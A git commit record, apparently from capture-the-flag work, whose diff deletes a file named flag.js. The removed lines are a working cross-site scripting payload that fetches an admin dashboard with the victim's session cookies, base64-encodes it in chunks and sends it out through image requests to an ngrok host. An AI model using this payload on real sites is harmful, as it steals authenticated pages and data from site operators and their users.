1bfc1ccc0d023255c754a02ca5492761bb2fd1a2
glno815 <78334532+glno815@users.noreply.github.com>
2026-03-16 23:13:32 +0700

    Delete flag.js

--- flag.js
+++
@@ -1,7 +0,0 @@
-fetch('/admin/dashboard',{credentials:'include'})
-.then(r=>r.text())
-.then(d=>{
-  for(let i=0;i<d.length;i+=1000){
-    new Image().src="https://30a8-2402-800-61c7-539d-60ad-28f0-6942-5ea2.ngrok-free.app?step="+i+"&data="+encodeURIComponent(btoa(d.slice(i,i+1000)));
-  }
-});
